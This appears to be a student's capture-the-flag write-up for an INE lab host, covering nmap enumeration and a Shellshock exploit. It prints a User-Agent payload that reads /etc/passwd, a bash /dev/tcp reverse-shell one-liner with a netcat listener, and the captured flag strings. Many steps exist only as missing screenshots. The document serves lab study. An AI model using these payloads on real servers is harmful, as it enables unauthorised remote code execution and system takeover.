Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local
### Nmap Scan

You ran:

nmap -sV -sC target1.ine.local

Result:

- Port 80 open
- Apache server running

Meaning:  
This is a **web server target**  
Attack surface = HTTP

![[Pasted image 20260404130148.png]]

Lets Check for hidden Directories (normal enumeration step)
![[Pasted image 20260404131552.png]]

## Payload (Shellshock Attack)
() { :; }; echo; echo; /bin/bash -c 'cat  /etc/passwd'

Add this in the User-agent and click send 
## Why this works
Because:
1. Apache is running CGI scripts
2. CGI uses Bash
3. Bash is vulnerable (Shellshock)

So when you send:
() { :; };
Bash gets confused and runs your command.

## What your payload does

() { :; };       → trigger Shellshock  
echo; echo;      → (formatting) echo; is used to separate our output command cleanly
Without echo:
HTTP/1.1 200 OKroot:x:0:0:root:/root:/bin/bash...  (Looks Messy)
/bin/bash -c     → run command  
'cat /etc/passwd' → command to execute
## What is `/etc/passwd`?
 It is a file that contains:
- usernames
- system accounts

root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin/nologin
Meaning:  
YOU SUCCESSFULLY EXECUTED COMMANDS ON THE SERVER


![[Pasted image 20260404163613.png]]



![[Pasted image 20260404162821.png]]

## Payload used:

bash -i >& /dev/tcp/IP/PORT 0>&1

---
## What this does

 Instead of just running ONE command  
 It gives you **full control of the machine**

Like:

you → full terminal inside victim

![[Pasted image 20260404205243.png]]

nc -nvlp 4444

This means:
- You are listening for incoming connection
![[Pasted image 20260404163722.png]]

![[Pasted image 20260404163819.png]]

FLAG1_97839ed819f64ed5a3320718e8d93a3a

# 2.) In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

![[Pasted image 20260404164106.png]]

![[Pasted image 20260404164655.png]]

![[Pasted image 20260404170713.png]]

![[Pasted image 20260404170729.png]]

![[Pasted image 20260404170744.png]]

![[Pasted image 20260404170803.png]]
FLAG3_04a84599867145df96f54e9d47bcb820

![[Pasted image 20260404171041.png]]

![[Pasted image 20260404171324.png]]

FLAG4_fbffac06a04f4cd2999bbad5379eea32


set a listener
nc -nvlp 4444
Add this in the User-agent : () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<your ip>/1234 0>&1'



